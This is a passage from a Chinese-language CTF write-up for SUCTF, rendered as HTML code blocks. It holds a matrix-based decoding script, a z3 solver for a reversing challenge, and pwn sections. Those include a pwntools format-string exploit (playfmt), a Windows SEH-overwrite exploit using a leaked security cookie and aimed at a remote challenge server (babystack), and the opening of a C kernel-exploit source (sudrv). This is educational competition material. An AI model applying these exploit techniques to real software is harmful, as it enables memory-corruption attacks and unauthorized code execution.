class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>],</span><br><span class="line">[<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>]])</span><br><span class="line">res = <span class="string">"FFFFFF94FFFFFF3800000126FFFFFF28FFFFFC1000000294FFFFFC9E000006EA000000DC00000006FFFFFF0CFFFFFDF6FFFFFA82FFFFFCD000000182000003DE0000014E000002B2FFFFF8D800000174FFFFFAA6FFFFF9D4000001C2FFFFF97C0000035A00000146FFFFFF3CFFFFFA14000001CE000007DCFFFFFD48000000980000085EFFFFFDB0FFFFFFBC0000036EFFFFFF4EFFFFF836000005C0000006AE0000069400000022"</span>.decode(<span class="string">"hex"</span>)</span><br><span class="line">y = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">    tmp = res[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>]</span><br><span class="line">    tmp = unpack(<span class="string">"&gt;i"</span>,tmp)[<span class="number">0</span>]</span><br><span class="line">    y.append(tmp)</span><br><span class="line">B = mat(y)</span><br><span class="line"></span><br><span class="line">B = B.reshape(<span class="number">42</span>,<span class="number">1</span>)</span><br><span class="line">B = A.I*B</span><br><span class="line">B = B.reshape(<span class="number">1</span>,<span class="number">42</span>)</span><br><span class="line">B = B.tolist()[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">    B[i] = int(round(B[i]))</span><br><span class="line">    B[i]^=i</span><br><span class="line">    B[i] = (B[i]&gt;&gt;<span class="number">3</span>)|(B[i]&lt;&lt;<span class="number">5</span>)</span><br><span class="line">    B[i]&amp;=<span class="number">0xff</span></span><br><span class="line">print(<span class="string">""</span>.join(map(chr,B)))</span><br></pre></td></tr></table></figure><h2><span id="rev">Rev</span></h2><p>不太懂c++，瞎调。</p><p>首先在<code>00000001400016A3</code>有两个check，一开始不知道干啥的，随便试</p><p>后面看到<code>sub_140002B80</code>里面有isspace和ispunct，猜测跟符号有关。瞎调调出来是用符号分割成几部分，第一个校验3部分，第二个校验第一部分的长度10</p><p>之后在<code>0000000140001763</code>附近把第一组异或了0xAB，然后和常量对比。然而常量只有5字节，实在想不出还有啥东西了，就直接跳过了</p><p>下一部分校验长度4，然后校验大写字母，然后是A-G，后一字节依次比前一字节大2，得出ACEG</p><p>最后一部分先是atoi，然后校验偶数，和两个方程。直接z3求出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> Solver</span><br><span class="line">s = Solver()</span><br><span class="line">x = BitVec(<span class="string">"x"</span>,<span class="number">32</span>)</span><br><span class="line">s.add(x&amp;<span class="number">1</span>==<span class="number">0</span>)</span><br><span class="line">s.add(((<span class="number">0x4D2</span> * x + <span class="number">0x162E</span>) / <span class="number">0x112C</span> ^ <span class="number">0xABCDDCBA</span>) == <span class="number">0xABCDB8B9</span>)</span><br><span class="line">s.add(((<span class="number">0x91E</span> * x + <span class="number">0x2693</span>) / <span class="number">0x1E61</span> ^ <span class="number">0x12336790</span>) == <span class="number">0x1233FC70</span>)</span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure><p>得到flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">suctf&#123;ACEG31415926&#125;</span><br></pre></td></tr></table></figure><h1><span id="pwn">Pwn</span></h1><h2><span id="playfmt">playfmt</span></h2><p>flag在堆上格式化字符串读出来就可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">main_ebp_offset = <span class="number">26</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_offset</span><span class="params">(format_str , offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> format_str.replace(<span class="string">"&#123;&#125;"</span> , str(offset))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_target</span><span class="params">(offset , name)</span>:</span></span><br><span class="line">    payload = format_offset(<span class="string">"%&#123;&#125;$p\x00"</span> , offset)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    text = p.recv()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">value = int(text.split(<span class="string">"\n"</span>)[<span class="number">0</span>] , <span class="number">16</span>)</span><br><span class="line">print(name + <span class="string">" : "</span> + hex(value))</span><br><span class="line"><span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify_byte</span><span class="params">(last_byte , offset)</span>:</span></span><br><span class="line">    payload = <span class="string">"%"</span> + str(last_byte) + <span class="string">"c"</span> + format_offset(<span class="string">"%&#123;&#125;$hhn"</span> , offset)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(addr , value , ebp_offset , ebp_1_offset)</span>:</span></span><br><span class="line">    addr_last_byte = addr &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        now_value = (value &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">        modify_byte(addr_last_byte + i ,  ebp_offset)</span><br><span class="line">        modify_byte(now_value , ebp_1_offset)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./playfmt"</span>)</span><br><span class="line"><span class="comment">#elf = ELF("./playfmt")</span></span><br><span class="line"><span class="comment">#p = remote("120.78.192.35",9999)</span></span><br><span class="line">elf = ELF(<span class="string">"./playfmt"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"=\n"</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">play_ebp_addr = get_target(<span class="number">6</span>,  <span class="string">"ebp"</span>)</span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">ebp_addr = get_target(<span class="number">6</span>,  <span class="string">"ebp"</span>)</span><br><span class="line">flag_ptr = <span class="number">19</span></span><br><span class="line">flag_addr = get_target(flag_ptr , <span class="string">"addr"</span>) - <span class="number">0x420</span></span><br><span class="line">log.info(hex(flag_addr))</span><br><span class="line"></span><br><span class="line">modify(ebp_addr + <span class="number">4</span> , flag_addr , <span class="number">6</span> , <span class="number">14</span>)</span><br><span class="line">payload = format_offset(<span class="string">"%&#123;&#125;$s\x00"</span> , <span class="number">14</span> + <span class="number">1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="babystack">babystack</span></h2><p>为方便本地测试，先可选头中的地址随机化选项关掉。</p><p>开始让你输入一个数，这里有栈溢出，但是没用，因为最后是直接exit掉的。</p><p>注意到<code>0040853C</code>有一处花指令，实际上这里就是获取下一行的地址，然后把输入减去这个地址，然后输入除以它。</p><p>这时想到，如果除以零会怎样，于是输入0040853C，发现通过异常处理进入了新的函数<code>sub_407F60</code></p><p>分析这里的功能，它提供了10次任意地址读取。输入选项yes和no的时候有栈溢出，同时如果输入的不是yes或no，调用fgets又能栈溢出。</p><p>开头写死了两个1。结束时会把他们相加然后与三校验，正确会输出flag。我们输入的字符串是在这两个数据高位的，所以不能溢出覆盖到他们。</p><p>同时由于最后也是exit掉的，所以也不能覆盖返回地址。</p><p>测试了下任意地址读取，如果输入非法地址会异常，进入一个异常处理函数。</p><p>观察一下函数开头的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00407F60                 push    ebp</span><br><span class="line">.text:00407F61                 mov     ebp, esp</span><br><span class="line">.text:00407F63                 push    0FFFFFFFEh</span><br><span class="line">.text:00407F65                 push    offset dword_47ACC0</span><br><span class="line">.text:00407F6A                 push    offset SEH_407F60</span><br><span class="line">.text:00407F6F                 mov     eax, large fs:0</span><br><span class="line">.text:00407F75                 push    eax</span><br><span class="line">.text:00407F76                 add     esp, 0FFFFFF2Ch</span><br><span class="line">.text:00407F7C                 mov     eax, ___security_cookie</span><br><span class="line">.text:00407F81                 xor     [ebp+var_8], eax</span><br><span class="line">.text:00407F84                 xor     eax, ebp</span><br><span class="line">.text:00407F86                 mov     [ebp+var_1C], eax</span><br><span class="line">.text:00407F89                 push    ebx</span><br><span class="line">.text:00407F8A                 push    esi</span><br><span class="line">.text:00407F8B                 push    edi</span><br><span class="line">.text:00407F8C                 push    eax</span><br><span class="line">.text:00407F8D                 lea     eax, [ebp+var_10]</span><br></pre></td></tr></table></figure><p>security_cookie是全局变量上一个值，每一个进程自始至终是固定的。它异或到了ebp-8的数据上，调试一下发现这里指向SEH结构体，之后又异或了ebp放到ebp-1Ch作为canary。</p><p>想到可以在栈上伪造一个seh结构体，然后把ebp-8覆盖成我们伪造的结构体，结构体中的异常处理函数改成程序中的后门地址。由于这个地址异或了cookie，所以我们还要读取cookie的值。</p><p>经过多次调试发现还有一些栈上的值不能变，通过计算偏移覆盖或者直接用任意地址读取后覆盖。需要注意的是ebp-4应为0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">main_aslr = <span class="number">0x1c395e</span></span><br><span class="line">main_addr = <span class="number">0x0040395E</span></span><br><span class="line">cookie_addr = <span class="number">0x0047C004</span></span><br><span class="line">stack_addr = <span class="number">0x19FF10</span></span><br><span class="line">cookie_aslr = cookie_addr-main_addr+main_aslr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span><span class="params">(stack)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Do you want to know more?"</span>)</span><br><span class="line">    p.sendline(<span class="string">"yes"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Where do you want to know?"</span>)</span><br><span class="line">    p.sendline(str(stack-stack_addr+stack_aslr))</span><br><span class="line">    p.recvuntil(<span class="string">"value is "</span>)</span><br><span class="line">    s = p.recvline().strip()</span><br><span class="line">    s = eval(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"121.40.159.66"</span>,<span class="string">"6666"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"stack address = "</span>)</span><br><span class="line">stack_aslr = eval(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">"stack:0x%x"</span>%stack_aslr)</span><br><span class="line">p.recvuntil(<span class="string">"main address = "</span>)</span><br><span class="line">main_aslr = eval(p.recv(<span class="number">8</span>))</span><br><span class="line">log.success(<span class="string">"main:0x%x"</span>%main_aslr)</span><br><span class="line">str4_addr = <span class="number">0x0019FE48</span>-stack_addr+stack_aslr</span><br><span class="line">p.recvuntil(<span class="string">"So,Can You Tell me what did you know?"</span>)</span><br><span class="line">p.sendline(<span class="string">"00408541"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Do you want to know more?"</span>)</span><br><span class="line">p.sendline(<span class="string">"yes"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Where do you want to know?"</span>)</span><br><span class="line">p.sendline(str(cookie_aslr))</span><br><span class="line">p.recvuntil(<span class="string">"value is "</span>)</span><br><span class="line">cookie = p.recvline().strip()</span><br><span class="line">cookie = eval(cookie)</span><br><span class="line">log.success(<span class="string">"cookie:0x%x"</span>%cookie)</span><br><span class="line">s1 = leak_stack(<span class="number">0x19fed4</span>)</span><br><span class="line">s4 = leak_stack(<span class="number">0x19fee0</span>)</span><br><span class="line">s5 = leak_stack(<span class="number">0x19fee4</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Do you want to know more?"</span>)</span><br><span class="line">p.sendline(<span class="string">"y"</span>)</span><br><span class="line">payload = <span class="string">'aaaa'</span> + p32(<span class="number">0xffffffe4</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0xffffff0c</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0xfffffffe</span>)+p32(<span class="number">0x408224</span>-main_addr+main_aslr)+p32(<span class="number">0x00408266</span>-main_addr+main_aslr)</span><br><span class="line">payload = payload.ljust(<span class="number">144</span>,<span class="string">"a"</span>) + p32(s1) + <span class="string">'a'</span>*<span class="number">8</span> + p32(s4) + p32(s5) + p32(cookie^str4_addr) + p32(<span class="number">0</span>)</span><br><span class="line">print(len(payload))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"Do you want to know more?"</span>)</span><br><span class="line">p.sendline(<span class="string">"yes"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Where do you want to know?\r\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"0"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="sudrv">sudrv</span></h2><p>格式化拿内核地址和栈地址，堆溢出覆盖，多次分配到栈上ROP。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 